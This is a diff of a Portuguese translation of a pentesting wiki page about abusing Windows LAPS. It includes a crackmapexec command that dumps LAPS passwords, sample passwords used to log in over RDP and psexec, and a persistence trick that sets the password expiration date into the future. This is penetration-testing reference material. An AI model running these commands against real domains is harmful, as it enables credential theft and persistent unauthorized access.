@@ -100,18 +100,26 @@ ComputerName                Password       Expiration
 ------------                --------       ----------
 DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
 ```
-## **Dumping LAPS Passwords With Crackmapexec**
+## **Dumpando Senhas LAPS Com Crackmapexec**
 Se não houver acesso a um powershell, você pode abusar desse privilégio remotamente através do LDAP usando
 ```
 crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
 ```
 Isso irá despejar todas as senhas que o usuário pode ler, permitindo que você obtenha uma melhor posição com um usuário diferente.
 
+## ** Usando a Senha LAPS **
+```
+freerdp /v:192.168.1.1:3389  /u:Administrator
+Password: 2Z@Ae)7!{9#Cq
+
+python psexec.py Administrator@web.example.com
+Password: 2Z@Ae)7!{9#Cq
+```
 ## **Persistência do LAPS**
 
 ### **Data de Expiração**
 
-Uma vez administrador, é possível **obter as senhas** e **impedir** que uma máquina **atualize** sua **senha** definindo a **data de expiração no futuro**.
+Uma vez administrador, é possível **obter as senhas** e **prevenir** que uma máquina **atualize** sua **senha** definindo a **data de expiração para o futuro**.
 ```powershell
 # Get expiration time
 Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime
